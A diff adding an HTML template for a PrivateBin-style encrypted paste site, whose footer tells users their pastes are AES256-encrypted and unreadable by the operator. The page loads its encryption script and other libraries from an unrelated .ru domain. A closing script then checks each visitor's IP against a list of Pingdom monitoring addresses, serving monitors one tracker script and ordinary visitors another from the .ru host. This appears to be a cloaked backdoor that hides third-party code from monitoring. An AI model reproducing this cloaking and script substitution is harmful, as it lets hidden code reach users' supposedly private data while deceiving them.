@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<meta name="robots" content="noindex" />
+		<title>p.k0nsl.org</title>
+		<!-- default PrivateBin theme with commits by k0nsl (i.am@k0nsl.org) -->
+		<link rel="stylesheet" href="https://cookieless-bin.k0nsl.org/css/amalek/boot.css" integrity="sha256-3VBMAePg/ewauutUdyOoqBmhb2+dEMChWe6XFFQ0MUU= sha384-DscFT1J+VAayb7zrr2V1ri2C4eF90yzsoFF34igG2Ee2/peoUqh/dajKYVTuBi26 sha512-rhG9kagfS7ZUiVDsRiYxJgW8oapoznaxYbkvT40ofgMqw/tvTIio64evM52LUPAUXbNTC7RUh0yHt+Zlmynevw==" crossorigin="anonymous" />
+		<link rel="stylesheet" href="https://cookieless-bin.k0nsl.org/css/amalek/flat.css" integrity="sha256-Nps3rpcItpBmdUYT42r8mQHKTvqEKdy1X6PZVQoVGXc= sha384-mG1lSEppD27vRjnhj/VNPmxWjyD7h4rEgPvvOBz0xoVmpU/t0eFdmZOpLQ1A4vUU sha512-mvpNuVSZqHlgYDv3EJvxr2XcLoTYDVCtJfJKlTcA3CyO9oL7SAPNupjWrHLLsg7WVak+qkLKi+J6Tt/ZxAugyg==" crossorigin="anonymous" />
+		<link rel="stylesheet" href="https://cookieless-bin.k0nsl.org/css/bootstrap/privatebin.css" integrity="sha256-ErlKBfv6wvuwqufDm8cvmDuR/bwlvDdF/UieSmACfnE= sha384-aiqtJAjs3+kkQ0UHBmtrxh4vzYnZgk2X8s1afhFn4pHLu1ySh2pgSBZ7cR2UUcmU sha512-qhMFlkToXS//s+oLAxbygNRXu3adbS3M41CA7MRDlOWBLHiMI2zJpo2JokEF2HFxnp/px9nu9sEDJe998fpBMw==" crossorigin="anonymous" />{if="$SYNTAXHIGHLIGHTING"}
+		<link rel="stylesheet" href="https://cookieless-bin.k0nsl.org/css/prettify/prettify.css" integrity="sha256-HS1ihgXZ6qfUcS5BTehJhV81EZR+I5Q6zx5yGdEqbp0= sha384-Idd9oLcdDqxPfUuMARR/TPo7z2VE5qgbFk6j2RHdfzB88HFW5Ecm8qSe0KjhtZ2S sha512-T23C9FH3sSw+W00kbZbvWt8h/P1h8Euj3cklmPSZNeyGekNivnCvp7KKIFju5D3blaYVmVaD0oAjbS2c+J+huQ==" crossorigin="anonymous" />{if="strlen($SYNTAXHIGHLIGHTINGTHEME)"}
+		<link rel="stylesheet" href="https://cookieless-bin.k0nsl.org/css/prettify/sons-of-obsidian.css" integrity="sha256-1iM/79UdwWZzwl5EA8ImfmLfVO6vemremMDCpGHn7fM= sha384-M02fvFlnG+B/XjbnYv1MVfeBx9skq1iMvRuhk7HN7s+HEKNsjAeYYGrvYk/aieud sha512-lJRJikF0GVQzYdoCpcRusQDMhAg3LTJt9gozJ7jSq7h8KRhj39HB4A/8Qh6vZWEgU4M4vrEOF9MY5FAaCysjPA==" crossorigin="anonymous" />{/if}{/if}
+
+		<style>
+		a:link {
+		    color: black;
+		}
+		a:visited {
+		    color: black;
+		}
+		a:hover {
+		    color: red;
+		}
+		a:active {
+		    color: darkred;
+		}
+		</style>
+		<script src="https://paste.js-cdn.ru/js/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44= sha384-rY/jv8mMhqDabXSo+UCggqKtdmBfd3qC2/KvyTDNQ6PcUJXaxK1tMepoQda4g5vB sha512-DUC8yqWf7ez3JD1jszxCWSVB0DMP78eOyBpMa5aJki1bIRARykviOuImIczkxlj1KhVSyS16w2FSQetkD4UU2w==" crossorigin="anonymous"></script>
+		<script src="https://paste.js-cdn.ru/js/sjcl-1.0.4.js" integrity="sha256-2pElt7FlibHuIhcmqP8kBm94nycgE0FFs6Qaiwdvs/Q= sha384-lfcQgOvH0hFXkj7sJwTArXZDp+KTfTsxu3cSxm4LsgATzEQ47CkvR441QJWsfzZo sha512-C+yJwJIecUoNyJ9TZbBZxosWOFM9ZSvtBkEG/c6XDLukQouFvRb4kk5H9BtZoaMTMEXJFHRukK8AHz/rLTfTsA==" crossorigin="anonymous"></script>
+		<script src="https://paste.js-cdn.ru/js/base64-2.1.9.js" integrity="sha256-TksTMFPWnyzxuc+SAbdtz2TTOz8HcKDvFyme5VoXMi4= sha384-XCWUWOpLYMuCbeTeB0sLgDQNguOwwwlLYIgKC5WYzs8J/FnYZiqekAUvVXkIXoUC sha512-rbqAby7hObftbEoGQzkhUbEh5YkUn2MtekTLs4btvo2oly4CZ3DxhJzEh0u/rNzS54tcJdqi5Ug1ruugEd2U1g==" crossorigin="anonymous"></script>
+		<script src="https://paste.js-cdn.ru/js/rawdeflate-0.5.js" integrity="sha256-bdd8bgkA+rcXZgwhgY6grXpXjltOiw4IHBO0Y6eRD+Q= sha384-9bNQ6sR3ofYTTyeMX5DrrFmiDAodclu+WT5VB5nKJelV9NVey/T2qpqvf9KjWdEu sha512-BWmYtWMXiXrrBX7pIFq3K+tNZsO1W7eCgVH5DIqVi9bWPGAyWoK6FChDOf/h2de7w3m5LmQfQqG/O6haX9zDxQ==" crossorigin="anonymous"></script>
+		<script src="https://paste.js-cdn.ru/js/rawinflate-0.3.js" integrity="sha256-8VLAefJzfdO8vSMVWQOa2yuIf/FAQoIkdlidhEnD+Ac= sha384-ErxZVcFnnZnEdiY9Iq+UuyAD/4WOuF9rWKeHFTgJqyy/ktyanCMPnbJuEmKbi0aF sha512-DGT+R6vEIoj1rzl0Qvv+JwRZZJIUwW9nOSQ0bBfRwFfOFNrBJRyAmd8DDxBWeCb/SC2F3iA9C7kxUW1QKryf1g==" crossorigin="anonymous"></script>
+		<script src="https://paste.js-cdn.ru/js/bootstrap-3.3.6.js" integrity="sha256-KXn5puMvxCw+dAYznun+drMdG1IFl3agK0p/pqT9KAo= sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS sha512-2e8qq0ETcfWRI4HJBzQiA3UoyFk6tbNyG+qSaIBZLyW9Xf3sWZHN/lxe9fTh1U45DpPf07yj94KsUHHWe4Yk1A==" crossorigin="anonymous"></script>{if="$SYNTAXHIGHLIGHTING"}
+		<script src="https://paste.js-cdn.ru/js/prettify.js" integrity="sha256-aCgw5NCunLpaCHSG0VN0aEAXROy9XmcIutJW94zwcjo= sha384-I8jtJFDRBzqxZDxWO/LNrBz4/qdjF/0fQSg1g6iKa4bCCr0yfdzQR+QOyHgShAaG sha512-m8iHxoN+Fe12xxFwWNdY/TS4KoFntHp29qY0xUzBnPd0bkKMOR/dFhEdTWydpt0b/fIXyhB+znGYUvgjfJ2RzQ==" crossorigin="anonymous"></script>{/if}{if="$MARKDOWN"}
+		<script src="https://paste.js-cdn.ru/js/showdown-1.4.1.js" integrity="sha256-HFpwVMQnVUyqglBfX3FvAqDN75E/4F5EWoNOzGECWao= sha384-TqQh/b/wfREEMy/zozpbFpx66RMjvhgWZv5xFNGy9PahZmWyKQO08ptMFrsOvXm+ sha512-Kbz1FIlDnqUJu/3yW8H8USzURA3JuUqSKRwz13lM4kWt6C0n6s4tjl81PCfnWtE4gBIzyj5uGePcfUyotk/icw==" crossorigin="anonymous"></script>{/if}
+		<script src="https://paste.js-cdn.ru/js/privatebin.js" integrity="sha256-u6eQXbuHgPmEfOiohvw5bhjABBHIyMa/p7lvq4/bPxQ= sha384-TTTGZEzamUtimheA5iA4OI0/Ti9P/z5BOFB5BE85VZkl4kAqEwS470rGWEEnLlYY sha512-YBMzyKBHHvCvKPv4zf0UeOFAnIXd4uyF7Ff2bNPPUdZ286I/U9A0WrjfO0xy7YR30lAxd3u2JZW+O4j3iJwN+A==" crossorigin="anonymous"></script>
+		<script src="https://paste.js-cdn.ru/js/misc.js" integrity="sha256-9hmF2X7eYB/rWG4x6oGPcL2LOxl/fVxCfVD5nLv5nug= sha384-uLrxSvmYWQOWaCEOyAZ/xiYf5xAZF6KfLYqMQPSAC+XbGW6TQb9wpgdbcyhYrcR4 sha512-MLNOYVoD+WnZvACiki+7t3/t8g5TMKy0Xaf8JpzGBd5VUYk3efkm1Cop9466oMJYrQt2aqU2iq6ZfFC7uSCr4A==" crossorigin="anonymous"></script>
+		<!--[if lt IE 10]>
+		<style type="text/css">#ienotice {display:block !important;} #oldienotice {display:block !important;}</style>
+		<![endif]-->
+		<link rel="apple-touch-icon" sizes="180x180" href="img/favicons/apple-touch-icon.png" />
+		<link rel="icon" type="image/png" href="img/favicons/android-chrome-192x192.png" sizes="192x192" />
+		<link rel="icon" type="image/png" href="img/favicons/favicon-32x32.png" sizes="32x32" />
+		<link rel="icon" type="image/png" href="img/favicons/favicon-96x96.png" sizes="96x96" />
+		<link rel="icon" type="image/png" href="img/favicons/favicon-16x16.png" sizes="16x16" />
+	</head>
+	<body role="document">
+		<nav class="navbar navbar-default navbar-static-top">
+				<div class="navbar-header">
+					<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" 
+data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+						<span class="sr-only">{function="i18n::_('Toggle navigation')"}</span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+					</button>
+				<a class="reloadlink navbar-brand" href="/">{function="i18n::_('p.k0nsl.org')"}</a>
+				</div>
+				<div id="navbar" class="navbar-collapse collapse">
+					<ul class="nav navbar-nav">
+						<li>
+							<button id="newbutton" type="button" class="reloadlink hidden btn btn-default navbar-btn">
+								<span class="glyphicon glyphicon-file" aria-hidden="true"></span> {function="i18n::_('New')"}
+							</button>{if="$EXPIRECLONE"}
+							<button id="clonebutton" type="button" class="hidden btn btn-default navbar-btn">
+								<span class="glyphicon glyphicon-duplicate" aria-hidden="true"></span> {function="i18n::_('Clone')"}
+							</button>{/if}
+							<button id="rawtextbutton" type="button" class="hidden btn btn-default navbar-btn">
+								<span class="glyphicon glyphicon-text-background" aria-hidden="true"></span> {function="i18n::_('Raw text')"}
+							</button>
+						</li>
+						<li class="dropdown">
+							<select id="pasteExpiration" name="pasteExpiration" class="hidden"> 
+{loop="EXPIRE"}
+								<option value="{$key}"{if="$key == $EXPIREDEFAULT"} selected="selected"{/if}>{$value}</option>{/loop}
+							</select>
+							<a id="expiration" href="#" class="hidden dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">{function="i18n::_('Expires:')"} <span id="pasteExpirationDisplay">{$EXPIRE[$EXPIREDEFAULT]}</span> <span class="caret"></span></a>
+							<ul class="dropdown-menu"> {loop="EXPIRE"}
+								<li>
+									<a href="#" onclick="$('#pasteExpiration').val('{$key}');$('#pasteExpirationDisplay').text('{$value}');return false;">
+										{$value}
+									</a>
+								</li>{/loop}
+							</ul>
+						</li>
+						<li>
+							<div id="burnafterreadingoption" class="navbar-text checkbox hidden">
+								<label>
+									<input type="checkbox" id="burnafterreading" name="burnafterreading" {if="$BURNAFTERREADINGSELECTED"} checked="checked"{/if} />
+									{function="i18n::_('Burn after reading')"}
+								</label>
+							</div>
+						</li>{if="$DISCUSSION"}
+						<li>
+							<div id="opendisc" class="navbar-text checkbox hidden">
+								<label>
+									<input type="checkbox" id="opendiscussion" name="opendiscussion" {if="$OPENDISCUSSION"} checked="checked"{/if} />
+									Open discussion
+							 	</label>
+							</div>
+						</li>{/if}{if="$PASSWORD"}
+						<li>
+							<div id="password" class="navbar-form hidden">
+								<input type="password" id="passwordinput" placeholder="{function="i18n::_('Password (recommended)')"}" class="form-control" size="19"/>
+							</div>
+						</li>{/if}{if="$FILEUPLOAD"}
+						<li id="attach" class="hidden dropdown">
+							<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">{function="i18n::_('Attach a file')"} <span class="caret"></span></a>
+							<ul class="dropdown-menu">
+								<li id="filewrap">
+									<div>
+										<input type="file" id="file" name="file" />
+									</div>
+								</li>
+								<li>
+									<a id="fileremovebutton" href="#">
+										{function="i18n::_('Remove attachment')"}"
+									</a>
+								</li>
+							</ul>
+						</li>{/if}
+						<li class="dropdown">
+							<select id="pasteFormatter" name="pasteFormatter" class="hidden"> 
+{loop="FORMATTER"}
+								<option value="{$key}"{if="$key == $FORMATTERDEFAULT"} selected="selected"{/if}>{$value}</option>{/loop}
+							</select>
+							<a id="formatter" href="#" class="hidden dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">{function="i18n::_('Format')"} <span id="pasteFormatterDisplay">{$FORMATTER[$FORMATTERDEFAULT]}</span> <span class="caret"></span></a>
+							<ul class="dropdown-menu"> {loop="FORMATTER"}
+								<li>
+									<a href="#" onclick="$('#pasteFormatter').val('{$key}');$('#pasteFormatterDisplay').text('{$value}');return false;">
+										{$value}
+									</a>
+								</li>{/loop}
+							</ul>
+						</li>
+					</ul>
+					<ul class="nav navbar-nav pull-right">{if="strlen($LANGUAGESELECTION)"}
+						<li id="language" class="dropdown">
+							<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"><span class="glyphicon glyphicon-flag" aria-hidden="true"></span> 
+{$LANGUAGES[$LANGUAGESELECTION][0]} <span class="caret"></span></a>
+							<ul class="dropdown-menu">
+{loop="LANGUAGES"}
+								<li>
+									<a href="#" class="reloadlink" onclick="document.cookie='lang={$key}';">
+									{$value[0]} ({$value[1]})
+								</a>
+							</li>{/loop}
+						</ul>
+					</li>{/if}
+					<li>
+						<button id="sendbutton" type="button" class="hidden btn btn-primary navbar-btn">
+							<span class="glyphicon glyphicon-upload" aria-hidden="true"></span> 
+Send
+						</button>
+					</li>
+				</ul>
+			</div>
+		</nav>
+		<header class="container">{if="strlen($NOTICE)"}
+			<div role="alert" class="alert alert-info">
+				<span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span> {$NOTICE|htmlspecialchars}
+			<img src="https://proxy.img-cdn.ru/20x20/https:/p.k0nsl.org/img/smilies/smirk01_k0nsl.png" alt="k0nsl-smirk">
+			</div>{/if}
+			<div id="remainingtime" role="alert" class="hidden alert alert-info">
+				<span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span>
+			</div>{if="$FILEUPLOAD"}
+			<div id="attachment" role="alert" class="hidden alert alert-info">
+				<span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span> <a>{function="i18n::_('Download attachment')"}</a> <span id="clonedfile" class="hidden">{function="i18n::_('Cloned file attached.')"}</span>
+			</div>{/if}{if="strlen($STATUS)"}
+			<div id="status" role="alert" class="alert alert-success">
+				<span class="glyphicon glyphicon-ok" aria-hidden="true"></span> {$STATUS|htmlspecialchars}
+			</div>{/if}
+			<div id="errormessage" role="alert" class="{if="!strlen($ERROR)"}hidden {/if}alert alert-danger"><span class="glyphicon glyphicon-alert" aria-hidden="true"></span> {$ERROR|htmlspecialchars}</div>
+			<noscript><div id="noscript" role="alert" class="nonworking alert alert-warning"><span class="glyphicon glyphicon-exclamation-sign" aria-hidden="true"></span> {function="i18n::_('Javascript is required for this application to work.<br />Sorry 
+for the inconvenience.')"}</div></noscript>
+			<div id="oldienotice" role="alert" class="hidden nonworking alert alert-danger"><span class="glyphicon glyphicon-alert" aria-hidden="true"></span> This application requires a modern browser to work.</div>
+			<div id="ienotice" role="alert" class="hidden alert alert-warning"><span class="glyphicon glyphicon-question-sign" aria-hidden="true"></span> {function="i18n::_('Still using Internet Explorer? Do yourself a favour, switch to a 
+modern browser:')"}
+				<a href="https://www.mozilla.org/firefox/">Firefox</a>,
+				<a href="https://www.opera.com/">Opera</a>,
+				<a href="https://www.google.com/chrome">Chrome</a>,
+				<a href="https://www.apple.com/safari">Safari</a>...
+			</div>
+			<div id="pasteresult" role="alert" class="hidden alert alert-success">
+				<span class="glyphicon glyphicon-ok" aria-hidden="true"></span>
+				<div id="deletelink"></div>
+				<div id="pastelink">{if="strlen($URLSHORTENER)"}
+					<button id="shortenbutton" data-shortener="{$URLSHORTENER|htmlspecialchars}" type="button" class="btn btn-primary">
+						<span class="glyphicon glyphicon-send" aria-hidden="true"></span> {function="i18n::_('Shorten URL')"}
+					</button>
+				{/if}</div>
+			</div>
+		</header>
+		<section class="container">
+			<article class="row">
+				<div id="image" class="col-md-12 text-center hidden"></div>
+				<div id="prettymessage" class="col-md-12 hidden">
+					<pre id="prettyprint" class="col-md-12 prettyprint linenums:1"></pre>
+				</div>
+				<div id="cleartext" class="col-md-12 hidden"></div>
+				<p class="col-md-12"><textarea id="message" name="message" cols="80" rows="25" class="form-control hidden"></textarea></p>
+			</article>
+		</section>
+		<section class="container">
+			<div id="discussion" class="hidden">
+				<h4>{function="i18n::_('Discussion')"}</h4>
+				<div id="comments"></div>
+			</div>
+		</section>
+
+		<footer class="container">
+			<div class="row">
+			 	<h4 class="col-md-5 col-xs-8"><small>{function="i18n::_('this site is operated and maintained by k0nsl (<a href="mailto:i.am@k0nsl.org">i.am@k0nsl.org</a>).')"}</small></h4>
+          		 	<p class="col-md-1 col-xs-4 text-center">{function="i18n::_('v0.22')"}</p>
+		 	<p id="aboutbox" class="col-md-6 col-xs-12">
+			{function="i18n::_('all pastes are AES256 encrypted &mdash; we cannot know what you paste..')"}
+		 	</p>
+			 </div>
+		</footer>
+
+		<div id="cipherdata" class="hidden">{$CIPHERDATA}</div>
+<script>
+  var ip;
+</script>
+<script src="https://l2.io/ip.js?var=ip"></script>
+<script>//alert(ip);</script>
+<script type="text/javascript">
+var pingdom=["173.208.58.138", "209.58.131.213", "173.208.58.138", "50.22.90.226"]
+var pingdomips=pingdom.join("|")
+pingdomips=new RegExp(pingdomips, "i")
+if (ip.search(pingdomips)!=-1){
+document.write('<scri'+'pt src="https://cookieless-bin.k0nsl.org/js/tracker.js" integrity="sha256-lBBwX8Q/W1pZKspJ9pbD0jKSoCuGQ3oRqHLDVPBPgz4= sha384-bS64rYSrq+q0OpDGUc9EdtrW+w9VuvmKZJw1ExjP4XuwGG4SBQqzyLk36yZSQiYc sha512-ob0B88Dt1UAyybG+a4Vl5EAcucfftBLqHs1hbDq85nJkGUdDS90fW/HWAwdnOOvdLQ/0Em2sh3nB1yNerf6/vA==" crossorigin="anonymous"><</'+'script>');
+} else {
+document.write('<scri'+'pt src="https://paste.js-cdn.ru/js/tracker.js" integrity="sha256-lBBwX8Q/W1pZKspJ9pbD0jKSoCuGQ3oRqHLDVPBPgz4= sha384-bS64rYSrq+q0OpDGUc9EdtrW+w9VuvmKZJw1ExjP4XuwGG4SBQqzyLk36yZSQiYc sha512-ob0B88Dt1UAyybG+a4Vl5EAcucfftBLqHs1hbDq85nJkGUdDS90fW/HWAwdnOOvdLQ/0Em2sh3nB1yNerf6/vA==" crossorigin="anonymous"></'+'script>');
+}
+</script>
+	</body>
+</html>
